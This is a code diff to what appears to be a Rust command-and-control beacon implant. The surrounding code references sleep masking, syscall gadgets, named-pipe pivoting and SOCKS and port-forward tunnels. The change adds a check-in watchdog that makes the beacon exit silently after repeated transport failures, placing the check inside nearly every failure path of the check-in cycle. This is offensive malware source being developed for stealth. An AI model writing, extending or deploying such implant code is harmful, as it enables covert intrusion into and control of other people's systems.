@@ -25,6 +25,7 @@ use specter_core::sleepmask::SleepMaskParams;
 use specter_core::syscalls::{ms_to_delay_interval, pick_gadget};
 use specter_core::time::{filetime_to_unix_epoch, is_expired};
 use specter_core::transport::{self, Task};
+use specter_core::watchdog::{Watchdog, DEFAULT_MAX_FAILS};
 use specter_core::wire::Writer;
 
 use crate::runtime::hwbp as beacon_hwbp;
@@ -98,6 +99,9 @@ pub struct Instance {
     /// Active SMB named-pipe pivot (`link`): the check-in transport runs
     /// over this pipe instead of WinHTTP until `unlink`.
     pub pivot: Option<crate::net::PivotState>,
+    /// Check-in watchdog: too many consecutive transport failures and the
+    /// beacon exits silently.
+    pub watchdog: Watchdog,
     /// Tunnel channels (socks/lportfwd/rportfwd): connected sockets and
     /// the rportfwd listener, drained every cycle.
     pub tunnels: [crate::tasks::Tunnel; crate::tasks::MAX_TUNNELS],
@@ -449,6 +453,7 @@ unsafe fn bootstrap() -> Option<Instance> {
         active_token: 0,
         ws2: core::ptr::null_mut(),
         pivot: None,
+        watchdog: Watchdog::new(DEFAULT_MAX_FAILS),
         tunnels: [crate::tasks::Tunnel::EMPTY; crate::tasks::MAX_TUNNELS],
         tunnels_len: 0,
         upload: None,
@@ -593,6 +598,9 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
         Some(len) => len,
         None => {
             crate::runtime::debug::log(instance, b"ci: fail beat\n");
+            if instance.watchdog.note_fail() {
+                syscalls::exit_thread(instance.exit_thread);
+            }
             return;
         }
     };
@@ -606,6 +614,9 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
         || !push_bytes(&mut headers, &mut hl, b"\r\n")
     {
         crate::runtime::debug::log(instance, b"ci: fail beat header\n");
+        if instance.watchdog.note_fail() {
+            syscalls::exit_thread(instance.exit_thread);
+        }
         return;
     }
     let mut hi = 0;
@@ -614,6 +625,9 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
             || !push_bytes(&mut headers, &mut hl, b"\r\n")
         {
             crate::runtime::debug::log(instance, b"ci: fail headers\n");
+            if instance.watchdog.note_fail() {
+                syscalls::exit_thread(instance.exit_thread);
+            }
             return;
         }
         hi += 1;
@@ -630,6 +644,9 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
         || (instance.results_len > 0 && !w.push(&instance.results[..instance.results_len]))
     {
         crate::runtime::debug::log(instance, b"ci: fail results\n");
+        if instance.watchdog.note_fail() {
+            syscalls::exit_thread(instance.exit_thread);
+        }
         return;
     }
     let mut chunk: [u8; 48 * 1024] = core::mem::MaybeUninit::uninit().assume_init();
@@ -640,6 +657,9 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
     crate::tasks::tunnel_tick(instance, &mut w);
     if !transport::finish_results(&mut w) {
         crate::runtime::debug::log(instance, b"ci: fail results\n");
+        if instance.watchdog.note_fail() {
+            syscalls::exit_thread(instance.exit_thread);
+        }
         return;
     }
     let mut body: [u8; 0x12005] = core::mem::MaybeUninit::uninit().assume_init();
@@ -647,6 +667,9 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
         Some(n) => n,
         None => {
             crate::runtime::debug::log(instance, b"ci: fail frame\n");
+            if instance.watchdog.note_fail() {
+                syscalls::exit_thread(instance.exit_thread);
+            }
             return;
         }
     };
@@ -679,6 +702,9 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
         Some(len) => len,
         None => {
             crate::runtime::debug::log(instance, b"ci: fail post\n");
+            if instance.watchdog.note_fail() {
+                syscalls::exit_thread(instance.exit_thread);
+            }
             return;
         }
     };
@@ -700,6 +726,9 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
         Some(range) => range,
         None => {
             crate::runtime::debug::log(instance, b"ci: fail range\n");
+            if instance.watchdog.note_fail() {
+                syscalls::exit_thread(instance.exit_thread);
+            }
             return;
         }
     };
@@ -709,7 +738,12 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
         // Empty payload = zero hosted tasks: the server writes nothing at
         // all between the prepend and append (no size header), which is a
         // successful check-in with an empty task pack.
-        crate::runtime::debug::log(instance, b"check-in: ok\n");
+        instance.watchdog.note_ok();
+        crate::runtime::debug::log(
+            instance,
+            b"check-in: ok
+",
+        );
         return;
     }
 
@@ -722,6 +756,9 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
         Some(pack) => pack,
         None => {
             crate::runtime::debug::log(instance, b"ci: fail pack\n");
+            if instance.watchdog.note_fail() {
+                syscalls::exit_thread(instance.exit_thread);
+            }
             return;
         }
     };
@@ -796,7 +833,12 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
         i += 1;
     }
     instance.results_len = i;
-    crate::runtime::debug::log(instance, b"check-in: ok\n");
+    instance.watchdog.note_ok();
+    crate::runtime::debug::log(
+        instance,
+        b"check-in: ok
+",
+    );
 }
 
 /// Beacon main, called by the entry stub. Never returns.
